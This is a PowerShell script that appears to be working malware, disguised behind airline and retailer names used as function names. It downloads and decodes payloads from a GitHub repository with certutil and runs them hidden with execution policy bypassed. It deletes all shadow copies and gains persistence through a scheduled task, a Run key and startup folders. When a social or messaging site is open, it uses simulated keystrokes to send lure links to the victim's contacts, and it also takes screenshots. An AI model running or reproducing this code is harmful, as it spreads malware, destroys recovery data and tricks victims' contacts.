﻿
#___________________________________________________

$Pbc = "C:\Users\Public\Windows"; $Pbv = "C:\Users\Public\Videos"; $Pbr = "C:\Users\Public\Recorded TV"; $Pbp = "$home\Pictures"; $global:x = 420; $global:y = 755; 

#___________________________________________________

function Pdq-Naivas
{
	if (!(Test-Path $global:Pb))
	{
		New-Item -Path $global:Pb -ItemType Directory
	}
	else
	{
		echo GoodlifePharmacy!
	}
}

#___________

$global:Pb = $Pbc
Pdq-Naivas

$global:Pb = $Pbv
Pdq-Naivas

$global:Pb = $Pbr
Pdq-Naivas

$global:Pb = $Pbp
Pdq-Naivas

#___________________________________________________

Set-Location -Path "C:\Users\Public\Windows"
Set-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value '@echo off'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'color 1a'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'cd /'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'mkdir "C:\Users\Public\Windows" || mkdir C:\Users\Public\Windows'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'cd C:\Users\Public\Windows || cd "C:\Users\Public\Windows"'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WendySeattle/EnvironmentalSciences/master/TRM-Carrefour1.uiaq" TRM-Carrefour1.uiaq'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WendySeattle/EnvironmentalSciences/master/TRM-Carrefour2.uiaq" TRM-Carrefour2.uiaq'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'cmd /c "type TRM-Carrefour1.uiaq TRM-Carrefour2.uiaq > TRM-Carrefour-e.uiaq & certutil.exe -decode TRM-Carrefour-e.uiaq TRM-Carrefour.ps1 & del /F /Q TRM-Carrefour-e.uiaq"'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'IF EXIST TRM-Carrefour.ps1 ('
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value '  PowerShell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -File "C:\Users\Public\Windows\TRM-Carrefour.ps1"'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value ') ELSE ('
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value '  ::call TRM-Carrefour.cmd'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value '  echo GoodLife'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value ')'
Add-Content -Path C:\Users\Public\Windows\TRM-Carrefour.cmd -Value 'exit'

certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WendySeattle/EnvironmentalSciences/master/TRM-Carrefour.uiaq" TRM-Carrefour.ps1

start-process "C:\Users\Public\Windows\TRM-Carrefour.cmd" -windowstyle hidden; Start-Sleep -s 10

#___________________________________________________

function Mage-Lo
{
	echo GoodlifePharmacy!
}

#___________________________________________________

function Braeside-Catering
{
	param(
	  [string]$Width,
	  [string]$Height,
	  [String]$FileName = "Screenshot"
	 
	)
	 
	function Take-Screenshot{
	[cmdletbinding()]
	param(
	 [Drawing.Rectangle]$bounds,
	 [string]$path
	)
		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
		$graphics = [Drawing.Graphics]::FromImage($bmp)
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
		$bmp.Save($path)
		$graphics.Dispose()
		$bmp.Dispose()
	}
	 
	function Get-ScreenResolution {
		$Screens = [system.windows.forms.screen]::AllScreens
		foreach ($Screen in $Screens) {
			$DeviceName = $Screen.DeviceName
			$Width  = $Screen.Bounds.Width
			$Height  = $Screen.Bounds.Height
			$IsPrimary = $Screen.Primary
			$OutputObj = New-Object -TypeName PSobject
			$OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
			$OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
			$OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
			$OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
			$OutputObj
		}
	}

	$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm-ss")
	$FileName = "{0}-{1}" -f $FileName, $datetime
	$Filepath = join-path $env:temp $FileName
	 
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
	[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")

	if(!($width -and $height)) { 
		$screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
		$Width = $screen.Width
		$Height = $screen.height
	}
	Mage-Lo
}

#___________________________________________________

#delete restore points
vssadmin delete shadows /all /quiet

#___________________________________________________

#create restore point

#___________________________________________________

function Aer-Lingus
{
	#Start-Sleep -s 2400
	SCHTASKS    /Create /SC MINUTE /MO 7 /TN georgia /TR "C:\Users\Public\Windows\README.cmd" /f
	SCHTASKS    /Create /SC MINUTE /MO 7 /TN georgia /TR C:\Users\Public\Windows\README.cmd /f

	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d "C:\Users\Public\README.cmd" /f
	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v cd5 /t REG_SZ /d C:\Users\Public\README.cmd /f

	if (!(Test-Path "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"))
	{
		New-Item -Path '$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ItemType Directory
		Copy-Item ".\README.cmd" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
	else
	{
		Copy-Item ".\README.cmd" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}

	if (!(Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"))
	{
		New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' -ItemType Directory
		Copy-Item ".\README.cmd" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
	else
	{
		Copy-Item ".\README.cmd" -Destination "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
	}
}

Aer-Lingus

#___________________________________________________

function Garuda-Indonesia
{
	Remove-Item "$Pbc\title.txt"

	$ProcessActive = Get-Process chrome -ErrorAction SilentlyContinue
	if($ProcessActive -eq $null) 
	{ 
		$ProcessActive = Get-Process firefox -ErrorAction SilentlyContinue
		if($ProcessActive -eq $null) 
		{
			$ProcessActive = Get-Process opera -ErrorAction SilentlyContinue
			if($ProcessActive -eq $null) 
			{
				exit
			}
			else
			{ 
				$global:brs = "opera"
				Get-Process opera |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
			}
		}
		else
		{
			$global:brs = "firefox"
			Get-Process firefox |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
		}
	} 
	else
	{ 
		$global:brs = "chrome"
		Get-Process chrome |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
	}

	Get-Content $Pbc\title.txt | Select-Object -Skip 3 | Out-File $Pbc\title2.txt
	Remove-Item $Pbc\title.txt
	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
	$title = $title.Trim()
	$title > $Pbc\title.txt
	Remove-Item $Pbc\title2.txt
}

Garuda-Indonesia

#___________________________________________________

Set-Location -Path $Pbc

$wshell = New-Object -ComObject wscript.shell;
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SFW {
 [DllImport("user32.dll")]
 [return: MarshalAs(UnmanagedType.Bool)]
 public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@
$fw =  (get-process $global:brs).MainWindowHandle
#[SFW]::SetForegroundWindow($fw)

function Mary-Gray
{
	$file = "$Pbc\title.txt"
	$title = [IO.File]::ReadAllText("$file")
	$string = $title
	if ($string -like "*$unique*") 
	{
		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Sex_Party.zip')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
		Start-Sleep -s 1
		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Sex_Party.docx')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
		Start-Sleep -s 1
		$wshell.SendKeys('Dont share!!')
		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')

				  #___________________________________________________

		Start-Sleep -s 2
		function Mage-Lo
		{
			$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height) 
			Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
		}

		Braeside-Catering

		$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
		Start-Sleep -s 1
		$png = ".\text.png"
		Rename-Item "$png" "z.$timestamp.png"

		Copy-Item $pwd\*.png -Destination $Pbr -recurse
		Remove-Item $pwd\*.png

				  #___________________________________________________

		Stop-process -Name cmd
		Stop-process -Name powershell
		exit
	}
	else
	{
		echo GoodlifePharmacy!
	}
}

#___________________________________________________

$unique = "facebook"; Mary-Gray
$unique = "gmail"; Mary-Gray
$unique = "yahoo"; Mary-Gray
$unique = "whatsapp"; Mary-Gray
$unique = "x.com"; Mary-Gray
$unique = "telegram"; Mary-Gray
$unique = "snapchat"; Mary-Gray
$unique = "instagram"; Mary-Gray
$unique = "proton"; Mary-Gray
$unique = "yandex"; Mary-Gray
$unique = "discord"; Mary-Gray
$unique = "twitch"; Mary-Gray

Stop-process -Name cmd
Stop-process -Name powershell

exit









	